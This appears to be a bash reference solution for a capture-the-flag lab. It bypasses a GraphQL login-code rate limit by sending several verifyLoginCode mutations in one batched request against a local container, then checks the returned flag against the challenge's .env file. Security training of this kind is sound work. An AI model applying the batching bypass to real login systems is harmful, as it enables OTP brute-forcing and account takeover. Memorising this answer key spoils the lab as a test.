#!/usr/bin/env bash
# ============================================================
# GraphQLBatchOTP (labs08) — reference solution: rate-limit
# bypass via GraphQL operation batching
#
# Chain: register own account -> sendLoginCode to own email ->
# ONE batch of three verifyLoginCode mutations (dummy codes;
# the flaw is the bypass, not a brute force). Flag arrives as
# the last element of the array response.
#
# NOTE: the flag is one-shot per container lifetime. If this
# script reports the latch already fired, re-arm with:
#   docker restart graphql-batch-otp-app
#
# Usage: ./run.sh [base-url]     (default http://localhost:8088)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8088}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
email="test-$(date +%s)-$RANDOM@arena.local"

echo "[*] registering disposable account $email" >&2
curl -fsS -o /dev/null -X POST "$BASE/auth/register" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$email\",\"name\":\"Test Agent\"}"

echo "[*] sending a login code to the own email" >&2
curl -fsS -o /dev/null -X POST "$BASE/graphql" -H 'Content-Type: application/json' \
  -d "{\"query\":\"mutation { sendLoginCode(email: \\\"$email\\\") { success } }\"}"

echo "[*] one batch of three verifyLoginCode mutations (dummy codes)" >&2
BODY="$(python3 - "$email" <<'PY'
import json, sys
email = sys.argv[1]
tpl = 'mutation {{ verifyLoginCode(code: "{code}", email: "{email}") {{ accessToken }} }}'
print(json.dumps([{"query": tpl.format(code=c, email=email)} for c in ("000000", "000001", "000002")]))
PY
)"
RESP="$(curl -fsS -X POST "$BASE/graphql" -H 'Content-Type: application/json' -d "$BODY")"

flag="$(python3 - "$RESP" <<'PY'
import json, sys
for item in json.loads(sys.argv[1]):
    f = (item.get("data") or {}).get("_result", {}).get("flag", "")
    if f:
        print(f)
        break
PY
)"
if [[ -z "${flag:-}" ]]; then
  echo "[-] no flag in batch response — the one-shot latch likely already fired." >&2
  echo "    Re-arm with: docker restart graphql-batch-otp-app" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
